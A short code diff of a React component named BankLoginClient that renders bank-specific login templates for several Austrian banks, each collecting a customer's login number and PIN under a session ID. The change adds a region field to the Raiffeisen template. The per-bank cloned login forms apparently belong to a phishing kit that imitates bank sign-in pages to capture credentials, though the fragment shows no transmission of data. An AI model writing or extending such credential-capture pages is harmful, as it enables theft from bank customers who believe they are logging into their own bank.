@@ -653,7 +653,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
     if (bankSlug === "bawag") return <BawagAg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
     if (bankSlug === "erste-bank") return <ErsteBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
-    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin, bundesland: loginMethod }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
     if (bankSlug === "volksbank") return <Volksbanken formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
     if (bankSlug === "posojilnica") return <PosojilnicaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
     if (bankSlug === "bank99") return <Bank99 formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
